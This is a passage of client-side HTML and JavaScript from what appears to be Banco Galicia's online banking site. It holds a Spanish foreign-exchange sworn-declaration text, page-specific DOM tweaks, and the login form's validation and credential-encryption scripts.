y su monto no supera el equivalente a pagar por capital e intereses en los próximos 365 días corridos.<br>2) En relación al punto 2 de la Com A 7030 y sucesivas, para el acceso al mercado de cambios para la realización de pagos de importaciones de bienes (códigos de concepto B05, B06, B07, B10, B12, B13, B15 y B16) o la cancelación de principal de deudas originadas en la importación de bienes (código de concepto P13), declaro bajo juramento que estamos encuadrados dentro de alguna de las siguientes situaciones:<br>2.1. el monto total de los pagos asociados a nuestras importaciones de bienes cursados a través del mercado de cambios a partir del 1.1.2020, incluido el pago cuyo curso se está solicitando, no supera en más del equivalente a US$ 1.000.000 el monto por el cual tendríamos acceso al mercado de cambio al computar las importaciones de bienes que constan a nuestro nombre en el sistema de seguimiento de pagos de importaciones de bienes (SEPAIMPO) y que fueron oficializadas entre el 01.01.2020 y el día previo al acceso al mercado de cambios, más el monto de los pagos cursados en el marco de los puntos 2.2. a 2.6 no asociados a importaciones comprendidas en el punto 2.1.1., menos el monto pendiente de regularizar por pagos de importaciones con registro aduanero pendiente realizados entre el 01.09.2019 y el 31.12.2019.<br>En el monto total de pagos de importaciones de bienes asociados a sus importaciones deberán también computarse los pagos por cancelaciones de líneas de crédito y/o garantías comerciales que fueron realizados por las entidades en virtud de importaciones del cliente.<br>2.2.se trate de un pago diferido o a la vista de importaciones de bienes que correspondan a operaciones que se hayan embarcado a partir del 01.07.2020 o que habiendo sido embarcadas con anterioridad no hubieran arribado al país antes de esa fecha.<br> En el caso de pagos diferidos de importaciones oficializadas a partir del 01.01.2020, la parte que se abona de tales importaciones no ha sido previamente computada a los efectos de realizar pagos en el marco del punto 2.1.<br>2.3. se trate de un pago asociado a una operación no comprendida en el punto 2.2. en la medida que sea destinado a la cancelación de una deuda comercial por importaciones de bienes con una agencia de crédito a la exportación o una entidad financiera del exterior o que cuente con una garantía otorgada por las mismas. En el caso de tratarse de pagos de importaciones oficializadas a partir del 01.01.2020, la parte que se abona de tales importaciones no ha sido previamente computada a los efectos de realizar pagos en el marco del punto 2.1.<br>2.4. se trate de un pago por: i) sector público, ii) todas las organizaciones empresariales, cualquiera sea su forma societaria, en donde el Estado Nacional tenga participación mayoritaria en el capital o en la formación de las decisiones societarias o iii) los fideicomisos constituidos con aportes del sector público nacional.<br>2.5. se trate de un pago con registro de ingreso aduanero pendiente a cursar por una persona jurídica que tenga a su cargo la provisión de medicamentos críticos a ingresar por Solicitud Particular por el beneficiario de dicha cobertura médica.<br>2.6. se trate de un pago de importaciones con registro aduanero pendiente destinado a la compra de kits para la detección del coronavirus COVID-19 u otros bienes cuyas posiciones arancelarias se encuentren comprendidas en el listado dado a conocer por el Decreto N° 333/2020 y sus complementarias.<br>2.7 se trate de otros pagos de importaciones de bienes, declarando bajo juramento que, incluyendo el pago anticipado cuyo curso se está solicitando, no supera el equivalente a US$ 3.000.000 (tres millones de dólares estadounidenses) del monto que surge al considerar los puntos 2.1.1. a 2.1.3. y se trata de pagos para la importación de productos relacionados con la provisión de medicamentos u otros bienes relacionados con la atención médica y/o sanitaria de la población o insumos que sean necesarios para la elaboración local de los mismos.<br>Por medio de la presente y en referencia a la Comunicación A 7030 punto 4 y sucesivas, declaramos bajo juramento que en la fecha y en los 90 días corridos anteriores no hemos concertado en el país ventas de títulos valores con liquidación en moneda extranjera o transferencias de los mismos a entidades depositarias del exterior (excepto por aquellas realizadas con el objeto de participar en el proceso de canje de títulos públicos abierto por el Gobierno Nacional o el Gobierno de la Provincia de Buenos Aires). Al mismo tiempo, nos comprometemos a no realizar este tipo de operaciones a partir del momento en que accedemos al mercado y por los 90 días corridos subsiguientes.<br>En el caso de haber realizado operaciones de títulos valores con el objeto de participar en el proceso de canje de títulos públicos abierto por el Gobierno Nacional o de la Provincia de Buenos Aires, nos comprometemos a presentar la correspondiente certificación de los bonos canjeados.<br>Que la información consignada en el presente formulario es exacta y verdadera en los términos previstos por el Régimen Penal Cambiario, y que; la documentación presentada para avalar esta operación es genuina no ha sido canalizada ni se cursará a través de ningún otro medio y los fondos provienen de actividades lícitas. Me/nos obligo/amos expresamente a colaborar con el Banco mediante el suministro de información, la entrega de documentación e informes, así como con la provisión de todos aquellos datos que sean necesarios y/o convenientes para que el Banco pueda dar acabado cumplimiento a las normas mencionadas en el plazo de 72 horas. <br>Tomo/amos conocimiento de que Banco de Galicia y Buenos Aires S.A.U se encuentra facultado a requerirme/nos toda la información necesaria para dar cumplimiento a las normas nacionales e internacionales sobre prevención del lavado de dinero y financiamiento del terrorismo (leyes n° 25.246 y n° 26.024, decretos, comunicaciones del Banco Central de la República Argentina, Resoluciones de la Unidad de Información Financiera, sus concordantes y complementarias.) Por lo expuesto, autorizo/autorizamos expresamente a Banco de Galicia y Buenos Aires S.A.U a realizar todos los controles y verificaciones que estime convenientes, a través de los medios que considere más eficaces, para dar cumplimiento a la normativa legal y reglamentaria vigente y a los estándares internacionales aceptados sobre Prevención del lavado de dinero y de otras actividades ilícitas y Prevención del financiamiento del terrorismo. <br>Dejamos expresa constancia que la presente no se encuentra relacionada ni directa ni indirectamente con persona humana y/o jurídica, pública o privada que pudiera tener vínculos con cualquier persona o entidad que pudiera considerarse vinculada a un régimen ilegítimo. En tal sentido y en ocasión del procedimiento anteriormente mencionado, reconozco/reconocemos que ese Banco tendrá la facultad de no cursar la operación solicitada en caso que considere vulneradas dichas normas estándares, con la debida notificación al ordenante de la transferencia, sin que ello genere en tal caso responsabilidad alguna a la Entidad. Así mismo, cuando los fondos sean incautados, embargados, retenidos, bloqueados o que por razones de Compliance o por cualquier otra causa se impida o demore la liquidación de las operaciones o no pueda acreditarse la transferencia al Beneficiario del Exterior, el Banco no será responsable, desistiendo expresamente el solicitante de reclamar cualquier gasto, daño, perjuicio, lucro cesante o intereses que dichas circunstancias puedan ocasionarle.<br>Esta operación se efectivizara considerando el tipo de cambio vigente al momento de su liquidación para este tipo de transacciones. El Banco de Galicia y Buenos Aires S.A.U no será responsable por demoras en el cierre de cambio, liquidación pago al exterior, derivadas del hecho de cualquier autoridad de aplicación cuya intervención deba ser requerida o que deba participar del procesamiento de la operación o que se originen en cualquier circunstancia fuera de su control. Declaro/amos expresamente que la operación arriba mencionada quedará perfeccionada con el cierre de cambio, canje y/o arbitraje y su correspondiente liquidación, la cual será realizada de acuerdo con los tiempos que demore el proceso operativo de la operación solicitada. En virtud de lo expuesto, asumo/mimos las consecuencias de los cambios normativos que puedan afectar el procesamiento de la operación al momento de su instrumentación, liberando al Banco de Galicia y Buenos Aires S.A.U de toda responsabilidad. Quedan a cargo del solicitante los gastos que se originen en consultas o aclaraciones que hubiera que hacer sobre los datos consignados en esta solicitud. En caso de solicitarse la anulación de esta operación, el Banco abonará en pesos el equivalente de la moneda extranjera al tipo de cambio comprador que rija el día en que se efectúe la devolución de acuerdo con las disposiciones en vigencia en ese momento y una vez obtenida la conformidad de anulación del Corresponsal interviniente y el crédito en cuenta de fondos libres. Esta entidad cumple con lo requerido en el artículo 12 de la Ley 25.326: <br>1. Es prohibida la transferencia de datos personales de cualquier tipo con países u organismos internacionales o supranacionales, que no proporcionen niveles de protección adecuados. <br>2. La prohibición no regirá en los siguientes supuestos: Transferencias bancarias o bursátiles, en lo relativo a las transacciones respectivas y conforme la legislación que les resulte aplicable. <br>La moneda de la solicitud de transferencia podrá convertirse a la moneda de curso legal en el país destino de los fondos, conforme al tipo de cambio fijado por el banco corresponsal/pagador correspondiente al momento de la conversión. Se deja constancia que, con la firma del presente, el cliente acepta y reconoce que el banco procesara la operación conforme a los datos que se hayan completado en éste y no será responsable por los errores u omisiones que se pudieran haber cometido al completar el mismo por parte del cliente. Por las operaciones de cierre de cambio, el Banco podrá percibir una comisión de US$ 30 (dólares estadounidenses treinta) por la revisión y el análisis personalizado de la documentación física presentada. Con la firma del presente, consiento/consentimos expresamente tal comisión y aceptamos que la misma sea debitada de mi/nuestra cuenta informada en esta solicitud. Reconozco/cemos expresamente el derecho de Banco de Galicia y Buenos Aires S.A.U a dar por concluida cualquier vinculación comercial o contractual que mantuviere conmigo/nosotros en caso de reticencia de mi/nuestra parte a presentar la información o documentación que éste requiriere, sin derecho a efectuar reclamo alguno por ello. <br>Tomo conocimiento que la falsedad en la presente Declaración jurada me hace pasible de las sanciones establecidas en el Régimen Penal Cambiario establecido por ley 19.359 y sus modificatorias.<br>Asumo el compromiso de mantener indemne y liberar de toda responsabilidad al Banco de Galicia y Buenos Aires S.A.U por cualquier daño y/o reclamo futuro que pudiera estar originado en una falsedad consignada en la presente declaración.'
document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > p:nth-child(3)").innerHTML = "";
document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > p:nth-child(4)").innerHTML ="";
document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > p:nth-child(3)").innerHTML = element.innerHTML;
}


 if(window.location.pathname == '/inversiones/inicio'){

 $(document).ajaxComplete(function( event, xhr, settings ) {
        if ( settings.url === "/Inversiones/GetPartialSidedrawerPlazoFijo" ) {   
var tipoPlazo = document.getElementById( 'SideBarPerfilPlazoFijo' ).getElementsByTagName( 'p' )[1].textContent;
var leyenda = document.querySelector("#SideBarPerfilPlazoFijo > div > div > div > p.f-size-12.text-grey.push-top-xs-15.push-top-10.notSensible") 
if(tipoPlazo == 'Tradicional'){
 $(leyenda).text('Recordá que podés cambiar la acción al vencimiento a través de Online Banking hasta un día hábil antes de la fecha de finalización del plazo, siempre que el mismo haya sido realizado por este canal o por la App. Si no podés cambiar la acción, comunicate con tu oficial o acercate a la sucursal más cercana.')    
} 
        }
    });

var overview = document.querySelector(".perfil-overview");
overview.insertBefore(element,overview.firstElementChild);

    $(document).ajaxComplete(function( event, xhr, settings ) {
       if ( settings.url === "/inversiones/ObtenerInversionesPorCuentasComitentes" ) {  
//Cambio blankstate error fima
 $('div[data-error-section="fondos-fima"]').each(function () {
     $('div[data-error-section="fondos-fima"] p:nth-child(2)').html("<strong>Ahora no podemos mostrarte el detalle de los fondos Fima</strong>");
      $('div[data-error-section="fondos-fima"] p:nth-child(3)').html("Por consultas, podés comunicarte con tu ejecutivo, escribirnos por redes o enviarnos un mail a <a href='mailto:bancogalicia@bancogalicia.com.ar'>bancogalicia@bancogalicia.com.ar</a>. Sabemos que te causamos inconvenientes, disculpanos. Estamos trabajando para solucionar el problema.");
    
 })
//Fin Cambio blankstate error fima
     }
  });        
}

if(window.location.pathname.toLowerCase() == '/turnos/solicitud' || window.location.pathname.toLowerCase() == '/turnos/exito' || window.location.pathname.toLowerCase() == '/turnos/horario')
{
    if ($("a[onclick=\"window.location.href='/inicio'\"]").length) 
    { 
        $('.btn-back').remove();
        $('#cancellationFlowButton').remove();
        $('a.logo').removeAttr("href").removeAttr("target");
    }
}

if(window.location.pathname == '/transferencias/transferencia-preconfirmacion')
{
    if(document.querySelector("#form1 > div.row.md > div:nth-child(5) > h3 > strong").textContent.indexOf("U$D") == 0){
        var element = document.createElement("div");
        element.innerHTML ="<div class='col-xs-9 alert-box push-top-xs-5 push-top-10 push-bottom-15 no-padding-left'><div class='box-user alert-border alert-border-blue cursor-d no-shadow no-margin-bottom'><i class='icon-left icon-info-blue pull-left'></i><div class='box-content no-padding-right push-left-20'><p class='alert-title f-size-20' data-hj-masked=''>Antes de transferir en dólares<br/></p><div class='alert-description text-grey'><span class='no-margin-bottom'>Es importante que sepas que la acreditación del dinero de la cuenta del destinatario<br> podrá tardar más de lo habitual o ser rechazada, según la Com. A7072 del BCRA.</span></div></div></div></div><div class='clearfix'></div>";

        var form = document.querySelector("#form1");
        form.insertBefore(element,form.firstElementChild);
    }
}

if(window.location.pathname == '/VerDebitosAutomaticos' ){
$(document).ajaxComplete(function( event, xhr, settings ) {
    var elementosDA = document.getElementById("debitosContainer")
    if (elementosDA.childElementCount>0){
    for (var i = 0; i < elementosDA.childElementCount; i++) {
    if(elementosDA.children.item(i).innerText.toLowerCase() == "mot.desco."){
    elementosDA.children.item(i).hidden = true
    }}}});}

if(window.location.pathname == "/cuentas/inicio"){

var cajas_segs_divs = document.querySelectorAll('.box_caja_seg'), i;

for (i = 0; i < cajas_segs_divs.length; ++i) {
 $(cajas_segs_divs[i]).find("h4").text("");
 $(cajas_segs_divs[i]).height(230);
 if ($(cajas_segs_divs[i]).find("h3").find("span").html() != "Sin deuda pendiente"){ var deuda_cs = $(cajas_segs_divs[i]).find("h3").find("span").html(); $(cajas_segs_divs[i]).find("h3").find("span").html("Deuda pendiente: "+ deuda_cs)}
}
//sidedrawer
document.querySelector("#sideBarDetalleCajaDeSeguridad > div > div > div > span:nth-child(7)").innerText =""
$('.box_caja_seg').click(function(){
    document.querySelector("#importe").innerText="";
});
}

if(window.location.pathname == '/seguridad/generar-clave-ingresar-du'){
$(".content-section").empty()
$(".content-section").addClass("xs")
$(".content-section.xs").append('<div class="col-xs-12 centered error-view"></div>')
$(".col-xs-12.centered.error-view").append('<div class="divaux"></div>')
$(".divaux").append("<div  class='content-msg-xs'></div>")
$(".content-msg-xs").append('<p class="icon icon-svg error"></p>')
$(".icon.icon-svg.error").after('<h5 class="error error2">Ahora no podemos crear tu Clave Galicia</h5>')
$(".error2").after('<p class="description error">                    No te preocupes, vas a poder crear tu clave llamando a Fonobanco al <b>0810-444-6500</b>.                    <br />                    También podés hacerlo en un <b>cajero automático o terminal de autoservicio de la red Galicia</b>, con tu tarjeta Galicia débito.                </p>')
$(".divaux").append('<div class="clearfix"></div>')
$(".divaux").append('<input id="Button1" type="button" onclick="window.location.href=\'/login\'" value="ENTENDIDO" class="btn btn-md-listo bottom only" />')
}
 
if(window.location.pathname == '/pagos/buscardeuda' || window.location.pathname == '/pagos/buscardeudaadhesion'  ){
    if(document.querySelector("#form-Pago > h5").textContent == "¿Cuál es el número de CUIT del contribuyente a pagar ?"){
 var letrero = '<div class="col-xs-12 alert-box push-top-xs-5 push-top-10 no-padding-left "><div class="box-user alert-border alert-border-blue cursor-d no-shadow" style="margin-bottom:30px"><i class="icon-left icon-info-blue pull-left"></i><div class="box-content no-padding-right push-left-20"><p class="alert-title" data-hj-masked="">Antes de pagar el VEP</p><div class="alert-description text-grey"><p class="no-margin-bottom push-right-20">Tené en cuenta que solo podrás pagar si sos quien generó el VEP en el sitio de AFIP, el contribuyente o ambos.</p></div></div></div></div><div class="clearfix"></div>';

document.querySelector("body > div.container-fluid > div.main > div.row.full-h > div.content-section.middle-view-content.xs.placeHolderAuto > div.col-xs-12").insertAdjacentHTML("afterbegin",letrero);
}}

if(window.location.pathname == '/inversiones/licitar-preconfirmacion'){
 $("p.description").remove()
}

//ODE
if(window.location.pathname == '/orden-extraccion/confirmacion')
{
document.querySelector("#cancellationFlowButton").href = "error/notfound.html";
}

if(window.location.pathname == '/transferencias/nuevocontactoconfirmar')
{
document.querySelector("body > div.container-fluid > div.main > div.row.full-h > div.content-section > div > div > input").className = "hidden";
document.querySelector("body > div.container-fluid > div.main > div.row.full-h > div.content-section > div > div > div.clearfix.visible-xs.content-extra-btn-xs.push-top-15 > input").className = "hidden";
}

//terminos y condiciones dolar mep
if(window.location.pathname == '/inversiones/v2/comprar-vender-dolar-mep-preconfirmacion'){
$('label[for=AceptaTerminosYCondicionesMEP]').html('Solicito a Banco Galicia la orden de compra en pesos de los bonos GD30 a precio de mercado, según el monto indicado. Solicito a Banco Galicia la orden de venta en dólares de los bonos GD30 que compró mediante la órden anterior, a precio de mercado. Declaro bajo juramento que he leído y acepto los <a href="javascript:void(0)"><span class="color-default"> Términos y Condiciones</span> de esta operación.</a>');
var tyc  = document.querySelector("#form > div.check-desc.push-top-30 > div > label > a")
$(tyc).attr("onclick", "event.stopPropagation(); javascript:window.open('/inversiones/v2/TyC_DolarMEP', '_blank'); return false;")
}

//Transferencias
if (window.location.pathname == '/transferencias/inicio')
{
$(document).ajaxComplete(function( event, xhr, settings ) {
if (settings.url.indexOf('/transferencias/SideHistorialTransferencias') > -1 && $("#mailDestinoComprobante").val() != '')
document.querySelector("#btn_enviarComprobante").disabled = false;
});
}

if (window.location.pathname == '/transferencias/confirmacion')
{
$(document).ajaxComplete(function( event, xhr, settings ) {
if (settings.url.indexOf('/EnvioDinero/SideTerceros') > -1 && $("#mailDestinoComprobante").val() !== '')
document.querySelector("#btn_enviarComprobante").disabled = false;
});
}

if (window.location.pathname == '/transferencias/confirmacion-haberes')
{
$(document).ajaxComplete(function( event, xhr, settings ) {
if (settings.url.indexOf('/EnvioDinero/SideHaberes') > -1 && $("#mailDestinoComprobante").val() !== '')
document.querySelector("#btn_enviarComprobante").disabled = false;
});
}

if(window.location.pathname == '/tarjetas/upgrade'){
    window.location.href = "error/sesionexpirada.html";  
}

if(window.location.href.indexOf("transferencias") > -1 )
{
	
	
	document.querySelector('#HelpIcon').onclick = function() {
		if(document.querySelector("#HelpContentContainer > div > div > div.table-container.no-margin > div:nth-child(3)") != null){
	document.querySelector("#HelpContentContainer > div > div > div.table-container.no-margin > div:nth-child(3)").remove()
	document.querySelector("#HelpContentContainer > div > div > div.table-container.no-margin > div:nth-child(3)").innerText = ' '
		}

	if(document.querySelector("#HelpContentContainer > div > div > ul") != null){
		
		if(document.querySelector("#HelpContentContainer > div > div > ul:nth-child(2) > li:nth-child(2)") != null && document.querySelector("#HelpContentContainer > div > div > ul:nth-child(2) > li:nth-child(2)").textContent.includes('mensual')) {
			document.querySelector("#HelpContentContainer > div > div > ul:nth-child(2) > li:nth-child(2)").remove()
		}
		
		if(document.querySelector("#HelpContentContainer > div > div > ul:nth-child(3) > li:nth-child(2)") != null && document.querySelector("#HelpContentContainer > div > div > ul:nth-child(3) > li:nth-child(2)").textContent.includes('mensual')) {
		document.querySelector("#HelpContentContainer > div > div > ul:nth-child(3) > li:nth-child(2)").remove()
		}
		
		if(document.querySelector("#HelpContentContainer > div > div > ul > li:nth-child(3) > ul > li:nth-child(2)") != null && document.querySelector("#HelpContentContainer > div > div > ul > li:nth-child(3) > ul > li:nth-child(2)").textContent.includes('mensual'))
		{
			document.querySelector("#HelpContentContainer > div > div > ul > li:nth-child(3) > ul > li:nth-child(2)").remove()
		}
	}
 }
}
if(window.location.pathname == '/quiero/inicio'){
$('a.btn.btn-lg.bottom').remove()
}
 } catch(e) { }


            if (sessionStorage.getItem('LinkExterno')) {
                //MANEJO DE ENLACES CUANDO SE ACCEDE DESDE UN PORTAL EXTERNO
                $('.logo').removeAttr('href');
                $('#btnCerrar, .page-header .icon-close, #cancellationFlowButton').attr('href', 'javascript:window.close();');
                $('.error-view #Button1, .exito-view #Button1').attr('onclick', 'javascript:window.close();');
            }
        });

    </script>

    
    <script type="text/javascript" language="javascript">
        //flag para evitar doble submit en el login simplificado al hacerlo con enter
        var remember = 'False' == 'True'? true : false;

        var processedLogin = false

		var refreshL = true;
         // Variable que se utiliza dentro del KeyBoard.Js
        var showKeyboard = false;

        function refreshLogin() {
            window.location.reload();
        }

        function validateForm(validator) {
            if (remember) {
                if (validator.numberOfInvalids() == 0 && $('#Password').val().length > 3) {
                    if(!processedLogin){
                        $('#submitButton').removeAttr('disabled');
                    }
                }
                else {
                    $('#submitButton').prop('disabled', 'true');
                }
            }
            else {
                if (validator.numberOfInvalids() == 0
                && $('#DocumentNumber').length > 0 && $('#DocumentNumber').val().length > 3
                && $('#UserName').length > 0 && $('#UserName').val().length > 1
                && $('#Password').val().length > 3) {
                    if(!processedLogin){
                        $('#submitButton').removeAttr('disabled');
                    }
                }
                else {
                    $('#submitButton').prop('disabled', 'true');
                }
            }

        }

        function validateInput(object, event, regEx) {
            maxLengthCheck(object);

            return ValidateRegExOnEvent(event, regEx);
        }

        function maxLengthCheck(object) {
            if (object.value.length > object.maxLength)
                object.value = object.value.slice(0, object.maxLength)
        }

		$(document).ready(function () {

            //Se eliminan variables del sessionStorage
            sessionStorage.setItem(
                'cardIndex',
                null
            );

            $('#popupErrorCredenciales').on('hidden.bs.modal', function () {
                unblockInputs();
                if (remember)
                    $("#Password").first().focus();
                else
                    $("#DocumentNumber").first().focus();
            });

            $("#DocumentNumber").on("drop paste", function () {
                var target = $(this);

                setTimeout(function () {
                    //get the value of the input text
                    var data = target.val();
                    //replace the special characters to ''
                    var dataFull = data.replace(regEx_alpha, '');

                    //set the new value of the input text without special characters
                    target.val(dataFull);
                });
            }).on('keydown', function (e) {
                if ((e.keyCode || e.which) == 38 || (e.keyCode || e.which) == 40) {
                    e.preventDefault();
                }
            });

            $("#DocumentNumber").on("input", function () {
                $('#RememberMe').prop("checked", false);
            });

            $("#Password").on("paste", function () {
                var target = $(this);

                setTimeout(function () {
                    //get the value of the input text
                    var data = target.val();
                    //replace the special characters to ''
                    var dataFull = data.replace(regEx_alpha, '');

                    //set the new value of the input text without special characters
                    target.val(dataFull);
                });
            });

            closeAlert();

            $('[data-toggle="tooltip"]').tooltip();

            try {
                $.validator.setDefaults({
                    highlight: function (element) {
                        $(element).closest('.inputArea').addClass('invalid');
                    },
                    unhighlight: function (element) {
                        $(element).closest('.inputArea').removeClass('invalid');
                    },
                    messageTarget: 'data-original-title',
                    errorElement: 'div',
                    errorClass: 'errorMsg',
                    errorPlacement: function (error, element) {
                        //Solo se fireaba una vez
                        error.attr('data-toggle', 'tooltip');
                        error.attr('data-placement', 'top');
                        error.insertAfter(element);

                        error.tooltip();
                    }
                });

                var validator = $("#form1").validate({ // initialize the plugin
                    onkeyup: function (element, event) {
                        var idElemento = $(element).attr('id');

                        if (idElemento == "UserName") {
                            if ($(element).val().length > 1) {
                                $(element).valid();
                            }
                        }
                        else if (idElemento == "Password") {
                            if ($(element).val().length > 3) {
                                $(element).valid();
                            }
                        }
                        else if (idElemento == "DocumentNumber") {
                            if ($(element).val().length > 3) {
                                $(element).valid();
                            }
                        }

                        validateForm(validator);
                    },
                    onfocusout: function (element) {
                        $(element).valid();
                        validateForm(validator);
                    },
                    invalidHandler: function () {
                        validateForm(validator);
                    }
                });

                setRulesLogin();

                setTimeout(function () {
                    $('#submitButton').prop('disabled', 'true');
                });



            }
            catch (e) { }

            document.getElementById("DevicePrintAdaptive").value = encode_deviceprint();

            if (remember)
                $("#Password").first().focus();
            else
				$("#DocumentNumber").first().focus();
        });

        function SubmitLoginForm() {

            processedLogin = true;

            $('#submitButton').prop('disabled', 'true');

            //En caso que el Teclado Virtual se este visualizando, lo cerramos
                 document.getElementById("simpleKeyboard").style.display = "none";
                 document.getElementById("keyboardIcon").style.color = "#666666";
                 showKeyboard = false;

            //Antes de realizar el submit borro el intervalo
			if ($('#Password').val() != "" && $('#Password').val().length == 4 && (remember || $('#UserName').val() != "" && $('#DocumentNumber').val() != "")) {
					 cmdEncrypt();
			}

		}

		function cmdEncrypt() {
            setMaxDigits(131);
            key = new RSAKeyPair("010001", "", "A6EF15DBE9527262B0A888B6089A4AABED76142A511A6DD46E1D370F5A13EF33CBE56FF956848D7AEDB0E95FED440392B931D83A932755B9663B2F987C6E7948FA6B09C789D31854AA3B30B2B10E522E4A9F8F8F27EE4E0AE8F559EF170F447FC8B2E3EE118319CA73E377097517FFC182756C34A0020C725AF11B0D94F65255");

            var userName = "null";
            if ($('#UserName').length != 0)
                userName = $('#UserName').val();

			var enc = encryptedString(key, "7J9PfIJ0J1O4QpiSgI1SK09gyd0=" + "\\" + base64encode(base64encode(userName) + "\\" + base64encode($('#Password').val())));

			$('#EncriptedPassword').val(enc);

			setDummyDataAndSubmit();

		}

		 function AESDataEncrypt() {

			var data = $('#UserName').val() + "\\" + $('#Password').val();

			var encryptedData;
             fetch(document.location.origin + "/users/SessionToken")
                 .then((response) => {
                     return response.text();
                 })
                 .then((datos) => {
                     var cleanedDatos = datos.replaceAll(/\\"/g, '').replaceAll('"','');
                     console.log(cleanedDatos);

                     encryptedData = AES_CBC_Encrypt(data, cleanedDatos);

                     $('#EncriptedPassword').val(encryptedData);

                     setDummyDataAndSubmit();
                 })

             //console.log(token);
             //console.log("");

			//encryptedData = AES_CBC_Encrypt(data, "");

		}

		function setDummyDataAndSubmit() {

			$('#Password').val("0000");

			var userName = "";

			if ($('#UserName').length != 0) {
				userName = $('#UserName').val();
				var l = userName.length;
				var dummyUserName = "";
				for (var i = 0; i < l; i++) {
					dummyUserName += "0";
				}
				$('#UserName').val(dummyUserName);
			}

			 $('#form1').submit();
		 }

        function evalEnter(e) {
            if (e.keyCode == 13 && (remember || document.getElementById('DocumentNumber').readOnly == false) && !processedLogin) {
                SubmitLoginForm();
            }
        }

        function enableDebug() {
            document.getElementById('isDebugEnabled').value = true;

            SubmitLoginForm();
        }

        function blockInputs() {
            if (remember) {
                document.getElementById('DocumentNumber').readOnly = true;
                document.getElementById('UserName').disabled = true;
            }
            document.getElementById('Password').disabled = true;
        }

        function unblockInputs() {
            if (remember) {
                document.getElementById('DocumentNumber').readOnly = false;
                document.getElementById('UserName').disabled = false;
            }
            document.getElementById('Password').disabled = false;
        }
    </script>
    <script type="text/javascript" src="Scripts/Keyboard/simple-keyboard.min.js"></script>
<script src="Scripts/Keyboard/polyfill.js" type="text/javascript"></script>
    <script src="Scripts/Keyboard/keyboard.js" type="text/javascript"></script>

</body>

</html>
